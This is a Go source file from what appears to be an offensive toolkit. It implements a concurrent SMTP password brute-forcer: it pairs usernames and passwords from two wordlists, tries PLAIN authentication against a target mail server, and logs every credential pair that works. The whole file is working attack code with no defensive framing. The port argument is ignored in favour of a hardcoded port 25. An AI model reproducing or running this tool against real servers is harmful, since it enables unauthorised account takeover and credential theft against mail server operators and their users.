package attacks

import (
	"fmt"
	"log"
	"net/smtp"
)

func workSMTP(job login, serverIP, serverPort string) {
	fmt.Println(yellow("[attemp] ", job))
	defer wg.Done()

	hostname := serverIP
	auth := smtp.PlainAuth("", job.user, job.pass, hostname)

	from := job.user
	msg := []byte("dummy message")
	recipients := []string{job.user}

	err := smtp.SendMail(hostname+":25", auth, from, recipients, msg)
	if err != nil {
		log.Println("[!]", err, red("[-] Login failed", job.user, ":", job.pass, " ", job.pos))
	} else {
		log.Println(green("[+][+] Session Connect at ", serverIP, ":", serverPort, " ", job.user, ":", job.pass, " ", job.pos))
	}
}

//SMTPattackStart SMTP attack with 2 files to iterate
func SMTPattackStart(userFile, passFile, serverIP, serverPort string, nWorkers int) {
	if nWorkers == 0 {
		nWorkers = 9
	}

	log.Println("[0] Starting jobs")
	log.Println(userFile, passFile, serverIP, serverPort, nWorkers)

	rchan := make(chan login, nWorkers)
	go Read2Files(userFile, passFile, rchan)
	var sem = make(chan int, nWorkers)
	for i := 0; i < nWorkers; i++ {
		sem <- 1
	}
	for {
		select {
		case job, ok := <-rchan:
			if !ok {
				wg.Wait()
				fmt.Println(yellow("[info] jobs finisished"))
				return
			}
			wg.Add(1)
			<-sem
			// sem <- 1
			go func(job login) {
				workSMTP(job, serverIP, serverPort)
				sem <- 1
				// <-sem
			}(job)
		}
	}

}
